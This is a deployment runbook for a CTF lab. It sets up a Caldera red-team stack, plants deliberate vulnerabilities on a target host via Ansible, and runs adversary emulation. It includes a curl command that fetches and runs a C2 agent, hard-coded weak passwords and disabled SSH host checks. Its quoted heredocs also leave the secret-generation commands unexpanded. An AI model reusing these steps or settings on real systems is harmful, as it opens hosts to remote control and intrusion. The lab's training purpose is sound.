# Deploy Stack — End-to-End Testing Runbook

Step-by-step runbook for deploying the CTF stack and running end-to-end validation: deploy stack → generate vulnerabilities → apply via Ansible → red team emulation via Caldera.

## Infrastructure

| Role | OS | Min Spec | Purpose |
|------|-----|----------|---------|
| Server | Ubuntu 24.04 | 2 vCPU / 4GB RAM | Runs deploy stack (Traefik, API, Registry, Caldera, Semaphore, Dockhand) |
| Target | Ubuntu 22.04+ | 1 vCPU / 1GB RAM | Receives vulnerabilities via Ansible, runs Caldera agent |

Both VPS instances need public IPs and SSH access. The server's hostname domain (e.g. `hostname.ye-et.com`) is used for Traefik TLS routing.

## Phase 1: Provision VPS Instances

```bash
# Via CloudLab MCP
mcp__cloudlab__create_instance(service="personal-linux-vm", os_name="Ubuntu 24.04 LTS x64", plan="vc2-2c-4gb", name="ctf-server")
mcp__cloudlab__create_instance(service="personal-linux-vm", os_name="Ubuntu 22.04 LTS x64", plan="vc2-1c-1gb", name="ctf-target")

# Get connection info for both
mcp__cloudlab__get_connection_info(hostname="<server-hostname>")
mcp__cloudlab__get_connection_info(hostname="<target-hostname>")
```

Note the IPs and SSH keys for both instances.

## Phase 2: Deploy Stack on Server

### 2.1 Install Dependencies

```bash
apt-get update -qq && apt-get install -y -qq docker.io docker-compose-v2 git ansible
systemctl enable --now docker
```

### 2.2 Clone Repo and Configure

```bash
cd /opt && git clone https://github.com/Your-Saviour/CTF-IT.git
cd /opt/CTF-IT

# Root .env (API config)
cat > .env << 'EOF'
SECRET_KEY=$(openssl rand -base64 32)
DATABASE_URL=sqlite:///data/ctf.db
EVENT_QUOTA={"vulnerability":{"easy":3,"medium":3,"hard":0},"hardening":{"easy":0,"medium":0,"hard":0},"application_external":{"easy":1,"medium":0,"hard":0}}
ROOT_PASSWORD=changeme123
REGISTRY_HOST=registry.<SERVER_DOMAIN>
REGISTRY_PUSH_HOST=ctf-registry:5000
API_HOST=ctf.<SERVER_DOMAIN>
EOF

# Deploy .env (stack config) — replace <SERVER_DOMAIN> with hostname.ye-et.com
cat > deploy/.env << 'EOF'
DOMAIN=<SERVER_DOMAIN>
ACME_EMAIL=admin@<SERVER_DOMAIN>
TRAEFIK_DASHBOARD_AUTH=admin:$(echo "$(htpasswd -nB admin)" | sed 's/\$/\$\$/g')
REGISTRY_AUTH=admin:$(echo "$(htpasswd -nB admin)" | sed 's/\$/\$\$/g')
CALDERA_TAG=latest
SEMAPHORE_ADMIN=admin
SEMAPHORE_ADMIN_PASSWORD=$(openssl rand -base64 16)
SEMAPHORE_ADMIN_NAME=Admin
SEMAPHORE_ADMIN_EMAIL=admin@example.com
SEMAPHORE_ACCESS_KEY_ENCRYPTION=$(openssl rand -base64 32)
SEMAPHORE_POSTGRES_PASSWORD=$(openssl rand -base64 32)
EOF

# Caldera config
cp deploy/caldera/config/local.yml.example deploy/caldera/config/local.yml
# Replace all REPLACE_ME values with generated secrets
sed -i "s/REPLACE_ME/$(openssl rand -base64 16)/g" deploy/caldera/config/local.yml
# Set agent callback to server's public IP
sed -i "s|app.contact.http: http://0.0.0.0:8888|app.contact.http: http://<SERVER_IP>:8888|" deploy/caldera/config/local.yml
```

### 2.3 Build Base Image and Start Stack

```bash
echo "ROOT_PASSWORD=changeme123" > base/.env
docker build --build-arg "$(cat base/.env)" -t ctf-base:latest base/
cd deploy && docker compose up -d --build
```

### 2.4 Open Firewall

```bash
ufw allow 80/tcp    # Traefik HTTP
ufw allow 443/tcp   # Traefik HTTPS
ufw allow 7010/tcp  # Caldera Sandcat TCP
ufw allow 7011/udp  # Caldera UDP
ufw allow 7012/tcp  # Caldera Manx WebSocket
ufw allow 8022/tcp  # Caldera SSH tunnel
ufw allow 2222/tcp  # Caldera FTP
ufw allow 8853/tcp  # Caldera DNS
ufw allow 8888/tcp  # Caldera HTTP (direct agent access)
ufw reload
```

### 2.5 Verify

```bash
docker compose ps  # All 7 containers should be "healthy"
```

Port 8888 (Caldera HTTP C2) is published in the compose file for direct agent communication.

## Phase 3: Generate Exports

### 3.1 Register Admin User

The first user registered is automatically granted admin. Use form data (not JSON).

```bash
# Via the API container (avoids needing to go through Traefik)
docker exec ctf-api python3 -c "
import requests
s = requests.Session()
s.post('http://localhost:8000/auth/register', data={
    'username': 'admin', 'password': 'Admin2026!', 'event_id': 1
})
s.post('http://localhost:8000/auth/login', data={
    'username': 'admin', 'password': 'Admin2026!'
})
print('Logged in, cookies:', list(s.cookies.keys()))
"
```

### 3.2 Export Ansible Playbook and Caldera Plugin

```bash
docker exec ctf-api python3 -c "
import requests
s = requests.Session()
s.post('http://localhost:8000/auth/login', data={'username': 'admin', 'password': 'Admin2026!'})

# Ansible export
r = s.post('http://localhost:8000/admin/ansible-export', json={'event_id': 1})
print('Ansible:', r.status_code, len(r.content), 'bytes')
open('/tmp/ansible_export.zip', 'wb').write(r.content)

# Caldera export
r = s.post('http://localhost:8000/admin/caldera-export', json={'event_id': 1})
print('Caldera:', r.status_code, len(r.content), 'bytes')
open('/tmp/caldera_export.zip', 'wb').write(r.content)
"

# Extract on host
docker cp ctf-api:/tmp/ansible_export.zip /opt/ansible_export.zip
docker cp ctf-api:/tmp/caldera_export.zip /opt/caldera_export.zip
mkdir -p /opt/ansible_export /opt/caldera_export
cd /opt/ansible_export && unzip -o /opt/ansible_export.zip
cd /opt/caldera_export && unzip -o /opt/caldera_export.zip
```

**Expected output:**
- `ansible_export/playbook.yml` + `scripts/` + `files/`
- `caldera_export/plugins/ctf-exploit/` with `hook.py`, `data/abilities/`, `data/adversaries/`

## Phase 4: Apply Vulnerabilities to Target

### 4.1 Prepare Target

On Ubuntu 24.04 targets, remove PEP 668 restriction for pip:

```bash
ssh -i <target_key> root@<TARGET_IP> "rm -f /usr/lib/python3.12/EXTERNALLY-MANAGED && \
  apt-get update -qq && apt-get install -y -qq python3 python3-pip python3-flask sqlite3"
```

### 4.2 Create Inventory and Run Playbook

```bash
cat > /opt/ansible_export/inventory << EOF
[targets]
<TARGET_IP> ansible_user=root ansible_ssh_private_key_file=<target_key_path> ansible_ssh_common_args='-o StrictHostKeyChecking=no'
EOF

cd /opt/ansible_export
ansible-playbook -i inventory playbook.yml --become
```

**Expected:** All tasks should show `changed` (not `failed`). Verify:

```bash
ssh root@<TARGET_IP> "
  ls /opt/inventory/inventory.db.bak          # Backup file exists
  grep secret_key /opt/inventory/app.py       # Hardcoded secret
  systemctl start inventory && curl -s http://localhost:5000/ | head -3  # Flask app running
"
```

## Phase 5: Caldera Red Team Emulation

### 5.1 Automated Caldera Setup

A single API call handles the full setup: generates the CTF plugin, copies it to the Caldera plugin directory, adds it to `local.yml`, restarts Caldera, waits for it to be healthy, and creates an adversary operation.

```bash
docker exec ctf-api python3 -c "
import requests
s = requests.Session()
s.post('http://localhost:8000/auth/login', data={'username': 'admin', 'password': 'Admin2026!'})
r = s.post('http://localhost:8000/admin/caldera-setup', json={'event_id': 1})
import json; print(json.dumps(r.json(), indent=2))
"
```

**Expected output:**
```json
{
  "status": "success",
  "plugin": {
    "files_copied": 12,
    "plugin_added_to_config": true,
    "abilities_loaded": 8,
    "adversaries_loaded": 3
  },
  "operation": {
    "id": "...",
    "name": "CTF Red Team Emulation",
    "state": "running"
  }
}
```

This replaces the manual steps: copying export files, editing `local.yml`, restarting Caldera, and creating the operation via API.

### 5.2 Deploy Sandcat Agent on Target

```bash
# On the TARGET VPS
SERVER="http://<SERVER_IP>:8888"
cd /tmp
curl -s -o sandcat "$SERVER/file/download" -H "platform: linux" -H "file: sandcat.go" --max-time 120
chmod +x sandcat
nohup ./sandcat -server $SERVER -v > /tmp/sandcat.log 2>&1 &
sleep 5
echo "Agent PID: $(pgrep -f sandcat)"
tail -5 /tmp/sandcat.log  # Should show "[+] Beacon (HTTP): ALIVE"
```

**Important:** Use `-H "platform: linux" -H "file: sandcat.go"` headers (not `-d` JSON body) for the download endpoint.

### 5.3 Monitor and Verify Results

Wait 3-5 minutes for all abilities to execute (12 abilities at ~15s intervals), then check:

```bash
docker exec ctf-caldera python3 -c "
import urllib.request, json, base64

headers = {'KEY': '<API_KEY_RED>'}

# List operations
req = urllib.request.Request('http://localhost:8888/api/v2/operations', headers=headers)
ops = json.loads(urllib.request.urlopen(req).read())
op = ops[-1]  # Latest operation
op_id = op['id']

# Get full operation details
req = urllib.request.Request(f'http://localhost:8888/api/v2/operations/{op_id}', headers=headers)
op = json.loads(urllib.request.urlopen(req).read())

status_map = {0: 'SUCCESS', 1: 'FAIL', -2: 'DISCARDED', 124: 'TIMEOUT', -3: 'COLLECTING'}
for link in op.get('chain', []):
    s = status_map.get(link.get('status'), 'OTHER')
    name = link.get('ability', {}).get('name', '?')
    
    # Decode result
    link_id = link.get('id')
    output = ''
    try:
        req2 = urllib.request.Request(f'http://localhost:8888/api/v2/operations/{op_id}/links/{link_id}/result', headers=headers)
        raw = json.loads(urllib.request.urlopen(req2).read()).get('result','')
        decoded = json.loads(base64.b64decode(raw))
        output = decoded.get('stdout','').strip()[:80]
    except:
        pass
    print(f'[{s}] {name}: {output}')

print(f'Total: {len(op.get(\"chain\",[]))} links')
"
```

## Success Criteria

- [x] All 7 deploy stack containers running and healthy
- [x] CTF API serves dashboard and admin panel
- [x] Ansible export generates valid playbook (200 response, valid zip)
- [x] Caldera export generates valid plugin with abilities (YAML list format)
- [x] Playbook applies vulnerabilities to target successfully (0 failures)
- [x] Caldera agent checks in from target (ALIVE beacon)
- [x] CTF adversary profiles and abilities load in Caldera
- [x] Adversary operation executes recon + exploit abilities
- [x] Vulnerabilities detected: hardcoded secret key, default credentials, database backup, rogue SSH key

## Known Issues and Gotchas

1. **Caldera ability YAML format**: Abilities must be YAML lists (`- id: ...`), not mappings (`id: ...`). The `caldera_ability.yml.j2` template handles this.

2. **Caldera ability name quoting**: Names containing colons (e.g. `Recon: SUID bit`) must be quoted in YAML. The template uses `"{{ ability_name }}"`.

3. **Plugin loading**: Caldera loads plugins at startup — no hot-reload. The plugin directory must exist before Caldera starts. Use a bind mount, not `docker cp` after start.

4. **Agent download**: Use HTTP headers (`-H "platform: linux" -H "file: sandcat.go"`) not JSON body (`-d '{"platform":...}'`) for the `/file/download` endpoint.

5. **Ubuntu 24.04 PEP 668**: If the target runs Ubuntu 24.04, remove `/usr/lib/python3.12/EXTERNALLY-MANAGED` before running module scripts that use `pip install`.

6. **Firewall**: Port 8888 must be open on the server for Caldera agent HTTP C2 communication. The deploy compose publishes 8888 on the host, but the server firewall (ufw) must also allow it.

## Cleanup

```bash
# Destroy both VPS instances
mcp__cloudlab__destroy_instance(hostname="<server-hostname>")
mcp__cloudlab__destroy_instance(hostname="<target-hostname>")
```
